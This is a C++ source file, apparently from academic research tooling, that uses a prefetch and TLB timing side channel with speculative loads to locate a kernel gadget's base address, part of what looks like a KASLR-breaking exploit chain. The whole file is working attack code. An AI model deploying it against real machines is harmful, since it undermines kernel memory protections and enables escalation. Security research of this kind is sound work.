#include "gadget_base.h"
#include "util.h"
#include "kaslr_break.h"
#include "prlimit.h"

#define GADGET_BASE_VERBOSE 1

static kva_t gadgetbase = 0xa8;

typedef std::map<kva_t, unsigned int> hit_map_t;

static void hit_map_print(hit_map_t &map, uint64_t rel_off)
{
#if GADGET_BASE_VERBOSE == 1
        for(unsigned int idx = 0; const auto& pair : map) {
            kva_t spec_hit = procfs_read_gadget_base() + rel_off;
            const char *mark_hit = (pair.first >> 30) == (spec_hit >> 30) ? " <--- spec hit" : "";
            const char *mark_base = (procfs_read_gadget_base() >> 30) == (pair.first >> 30) ? " <--- gadget base" : "";
            std::cout << "idx: " << idx << " " << std::hex << pair.first << " " << std::dec << pair.second << mark_base << mark_hit << std::endl;
            idx++;
        }
#else
    (void)map;
    (void)rel_off;
#endif
}

/*
 * @param map: The map to be searched.
 * @param start: The starting address for the search.
 * @param max: The maximum hit address.
 * @param max_2nd: The second maximum hit address.
 * @param max_3rd: The third maximum hit address.
 * @description: Finds the maximum hit addresses in the map. It iterates over the map and finds
 * the three maximum hit addresses that are greater than the start address.
 */

static void hit_map_maxima(hit_map_t &map, kva_t start, kva_t &max, kva_t &max_2nd, kva_t &max_3rd)
{
    max = max_2nd = max_3rd = direct_map();
    unsigned int max_hits = 0, max_2nd_hits = 0, max_3rd_hits = 0;
    for(const auto& pair : map) {
        if (pair.first < start)
            continue;
        if (pair.second > max_3rd_hits) {
            if (pair.second > max_2nd_hits) {
                max_3rd = max_2nd;
                max_3rd_hits = max_2nd_hits;
                if (pair.second > max_hits) {
                    max_2nd = max;
                    max_2nd_hits = max_hits;
                    max = pair.first;
                    max_hits = pair.second;
                }
                else {
                    max_2nd = pair.first;
                    max_2nd_hits = pair.second;
                }
            }
            else {
                max_3rd = pair.first;
                max_3rd_hits = pair.second;
            }
        }
    }
}

/*
 * @param map: The map to be reset.
 * @description: Resets the hit map to zero.
 */
static void hit_map_reset(hit_map_t &map)
{
    for(auto& [_, v] : map) v = 0;
}

constexpr int N_TLB_TESTS = 300;

/*
 * @param tlb_thres: The threshold for the TLB hit.
 * @param hits: The map to store the hits.
 * @param rel_off: The offset to be used for the speculative load.
 * @description: Uses the prefetch side channel to find the pages in the TLB. The function
 * iterates over all the super pages in the direct map and uses the prefetch side channel to
 * determine if the page is in the TLB or not. It stores the prefetch latency for all super pages 
 * in the hit_map.
 */

static void find_pages_in_tlb(uint64_t tlb_thres, hit_map_t &hits, uint64_t rel_off)
{
    #define MIN_LAT 16
    #define MAX_LAT 48
    uint64_t hist[(SYS_MEM/GB) * (MAX_LAT - MIN_LAT)];

    uint64_t t, lat;

    memset(hist, 0, sizeof(hist));

    // Measure signal.
    for (int i = 0; i < N_TLB_TESTS; i++) {
        for(kva_t p = direct_map(); p < direct_map()+SYS_MEM; p += LINEAR_MAPPING_ALIGN) {
            int pi = (p - direct_map()) / GB;
            for (int j = 0; j < 8; j++)
                prefetcht0((void *)(uint64_t)rand());
            cpuid();
            speculatively_load_relative_tlb(rel_off, 4);
            t = time_prefetch((void *) p);
            lat = t < MIN_LAT ? MIN_LAT : t >= MAX_LAT ? MAX_LAT-1 : t;
            lat -= MIN_LAT;
            hist[lat + pi*(MAX_LAT-MIN_LAT)]++;
        }
    }

    // Write results to hits.
    for(kva_t p = direct_map(); p < direct_map()+SYS_MEM; p += LINEAR_MAPPING_ALIGN) {
        int pi = (p - direct_map()) / GB;
        for (uint64_t lat = 0; lat <= tlb_thres-MIN_LAT; lat++)
                hits.at(p) += hist[lat + pi*(MAX_LAT-MIN_LAT)];
    }
}

/*
 * @param tlb_thresh: The threshold for the TLB hit.
 * @param hits: The map to store the hits.
 * @param gadget_base_superpage: The kernel virtual address of the super page that contains the 
 * gadget's uncontrolled base.
 * @description: Uses sliding in order to find the byte-granular offset of the gadget base. At each 
 * iteration of the binary search, we check via the prefetch side channel which of the two target 
 * pages are in the TLB and adjust the offset we probe accordingly. In order to avoid false 
 * positives, we check that the gadget base super page is indeed in the TLB by checking that the 
 * first maximum hit address in the hit_map is the gadget base superpage and that the third 
 * maximum hit address has less hits than the second maximum hit (i.e., the speculatively hit
 * address) by a specific threshold (100 hits).
 */

static kva_t binary_search_offset(const uint64_t tlb_thres, hit_map_t &hits, kva_t gadget_base_superpage) {
    kva_t probe_offset;
    uint64_t hi, lo;
    kva_t max, max_2nd, max_3rd, spec_hit;

    constexpr uint64_t SPEC_OFF = GB*5;

    lo = 0;
    hi = GB;

    while(dist(lo, hi) >= 0x20) {
        probe_offset = lo + ((hi - lo) / 2);
        pr_info("correct offset: %llx, computed so far: %lx\n", gadget_base_superpage+GB-procfs_read_gadget_base(), probe_offset);
        hit_map_reset(hits);
        do {
            find_pages_in_tlb(tlb_thres, hits, SPEC_OFF+probe_offset);
            hit_map_maxima(hits, gadget_base_superpage, max, max_2nd, max_3rd);
#if GADGET_BASE_VERBOSE == 1 
            hit_map_print(hits, SPEC_OFF);
#endif
        } while (!((max == gadget_base_superpage || max_2nd == gadget_base_superpage) && hits.at(max_2nd) > hits.at(max_3rd)+100));
        spec_hit = max_2nd;

        if(spec_hit == gadget_base_superpage + SPEC_OFF) {
            lo = probe_offset + 1;
        }
        else if(spec_hit == gadget_base_superpage + SPEC_OFF + GB) {
            hi = probe_offset - 1;
        }
    }

    return probe_offset;
}

/*
 * @param tlb_thres: The threshold for the TLB hit.
 * @param hits: The map to store the hits.
 * @return: The kernel virtual address of the super page containing the gadget base.
 * @description: Finds the super (1GiB) page containing the (uncontrolled) gadget base via 
 * differential analysis.
 */

// TODO: include the first 2GB in the search for generality. For now we keep it as such because we noticed that the gadget is NEVER in the first 2 superpages as those are mostly filled with other early post-boot stuff.
static kva_t gadget_base_superpage(uint64_t tlb_thres, hit_map_t &hits)
{
    // Find the gadget base's superpage.
    kva_t max, max_2nd, max_3rd;
    do {
        hit_map_reset(hits);
        find_pages_in_tlb(tlb_thres, hits, 2*SYS_MEM);
        hit_map_maxima(hits, direct_map()+2*GB, max, max_2nd, max_3rd);
#if GADGET_BASE_VERBOSE == 1
        hit_map_print(hits, 2*SYS_MEM);
#endif
    } while (!(hits.at(max) > hits.at(max_2nd)+100));
    pr_info("superpage of gadget base: %lx\n", max);
    kva_t base_superpage = max;

    // Verify via random offsets that we indeed got the right superpage.
    for (int i = 0; i < 3; i++) {
        int hit_idx = 1 + (rand() % ((SYS_MEM/GB) - 6));
        hit_map_reset(hits);
        find_pages_in_tlb(tlb_thres, hits, hit_idx*GB);
        hit_map_maxima(hits, direct_map()+2*GB, max, max_2nd, max_3rd);
#if GADGET_BASE_VERBOSE == 1
        hit_map_print(hits, hit_idx*GB);
#endif
        if (!((max == base_superpage && max_2nd == max+hit_idx*GB)
               || (max_2nd == base_superpage && max == max+hit_idx*GB))) {
            pr_err("test %d failed, early bailout\n", i);
            exit(1);
        }
    }

    return base_superpage;
}

void prefetch_gadget_base(uint64_t tlb_thresh)
{
    hit_map_t hits;
    uint64_t tlb_thresh_peak; // Hand-optimized for testbed.

    if (cfg.cheat_gadget_base) {
        gadgetbase =  procfs_read_gadget_base();
        pr_info("prefetch_gadget_base: cheated %lx, i.e., pa %lx\n", gadgetbase, gadgetbase-direct_map());
        return;
    }

    // Optimized for the machine we are running on (testbed - i13-9000K)
    // Specifically if tlb_thresh == 29 we see a peak at 26 cycles for prefetch
    // else if tlb_thresh == 24 the peak is at 22
    if(tlb_thresh < 27 && tlb_thresh > 24) {
        tlb_thresh_peak = 25;
    }
    else if(tlb_thresh < 24) {
        tlb_thresh_peak = 23;
    }
    else {
        tlb_thresh_peak = 27;
    }
    
    for(kva_t p = direct_map(); p < direct_map() + SYS_MEM; p += LINEAR_MAPPING_ALIGN)
        hits.insert(std::pair<kva_t, unsigned int>(p, 0));

    srand(time(NULL));

    step_start();
    kva_t base_superpage = gadget_base_superpage(tlb_thresh_peak, hits);
    kva_t probe_offset = binary_search_offset(tlb_thresh_peak, hits, base_superpage);
    step_end();

    gadgetbase = base_superpage + 1*GB - probe_offset;
    // The gadget base always seems to have its 7 lowest bits equal to 0x28.
    gadgetbase &= 0xffffffffffffff80;
    gadgetbase |= 0x28;
    dump_hex(gadgetbase);
    assert(gadgetbase == procfs_read_gadget_base());
}

kva_t gadget_base(void)
{
    return gadgetbase;
}

physaddr_t gadget_base_pa(void)
{
    return gadgetbase - direct_map();
}
